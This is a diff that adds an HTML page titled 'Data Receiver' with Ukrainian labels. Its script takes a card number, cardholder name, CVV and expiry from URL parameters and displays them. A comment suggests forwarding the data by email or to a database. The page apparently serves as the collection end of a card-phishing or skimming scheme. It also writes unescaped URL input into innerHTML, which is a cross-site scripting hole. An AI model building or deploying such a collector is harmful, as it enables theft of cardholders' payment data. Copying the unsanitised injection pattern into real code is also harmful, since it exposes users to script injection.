@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Receiver</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .data { background: #f0f0f0; padding: 20px; margin: 10px 0; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Отримані дані:</h1>
+    <div id="dataContainer"></div>
+
+    <script>
+        // Отримуємо дані з URL параметрів
+        const urlParams = new URLSearchParams(window.location.search);
+        const number = urlParams.get('number');
+        const name = urlParams.get('name');
+        const cvv = urlParams.get('cvv');
+        const expiry = urlParams.get('expiry');
+
+        if (number) {
+            const dataDiv = document.getElementById('dataContainer');
+            dataDiv.innerHTML = `
+                <div class="data"><strong>Номер картки:</strong> ${number}</div>
+                <div class="data"><strong>Ім'я:</strong> ${name || 'Не вказано'}</div>
+                <div class="data"><strong>CVV:</strong> ${cvv || 'Не вказано'}</div>
+                <div class="data"><strong>Термін дії:</strong> ${expiry || 'Не вказано'}</div>
+                <div class="data"><strong>Час:</strong> ${new Date().toLocaleString('de-DE')}</div>
+            `;
+            
+            // Можна також відправляти кудись ще (на пошту, в базу даних тощо)
+            console.log('Отримані дані:', { number, name, cvv, expiry });
+        }
+    </script>
+</body>
+</html>
